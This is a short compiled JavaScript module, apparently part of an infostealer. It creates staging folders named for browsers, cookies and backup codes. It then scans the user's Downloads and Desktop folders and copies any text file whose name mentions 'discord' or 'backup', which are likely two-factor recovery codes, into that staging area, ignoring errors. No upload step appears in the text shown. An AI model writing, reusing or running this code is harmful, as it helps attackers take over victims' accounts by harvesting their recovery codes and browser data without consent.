Object.defineProperty(exports, "__esModule", {
  value: true
});
const fs = require("fs");
const path = require("path");
const os = require("os");
class StorageService {
  static async init(directory) {
    if (!fs.existsSync(directory)) fs.mkdirSync(directory, {
      recursive: true
    });
    const browsers = path.join(directory, "browsers");
    const cookies = path.join(directory, "allcookies");
    const backups = path.join(directory, "backupCodes");
    if (!fs.existsSync(browsers)) fs.mkdirSync(browsers, {
      recursive: true
    });
    if (!fs.existsSync(cookies)) fs.mkdirSync(cookies, {
      recursive: true
    });
    if (!fs.existsSync(backups)) fs.mkdirSync(backups, {
      recursive: true
    });
    await this.processBackupCodes(path.join(directory, "backupCodes"));
  }
  static cleanup(directory) {
    if (fs.existsSync(directory)) fs.rmSync(directory, {
      recursive: true,
      force: true
    });
  }
  static async processBackupCodes(destination) {
    const home = os.homedir();
    const directories = [path.join(home, "Downloads"), path.join(home, "Desktop")];
    let created = false;
    for (const directory of directories) {
      try {
        if (!fs.existsSync(directory)) continue;
        for (const entry of fs.readdirSync(directory, {
          withFileTypes: true
        })) {
          if (entry.isSymbolicLink()) continue;
          const name = entry.name;
          if (!name.toLowerCase().endsWith(".txt")) continue;
          if (!name.toLowerCase().includes("discord") && !name.toLowerCase().includes("backup")) continue;
          if (!created) {
            fs.mkdirSync(destination, {
              recursive: true
            });
            created = true;
          }
          const source = path.join(directory, name);
          const target = path.join(destination, name);
          try {
            fs.copyFileSync(source, target);
          } catch (error) {}
        }
      } catch (error) {
        if (error.code === "EPERM" || error.code === "EACCES") continue;
      }
    }
  }
}
exports.StorageService = StorageService;
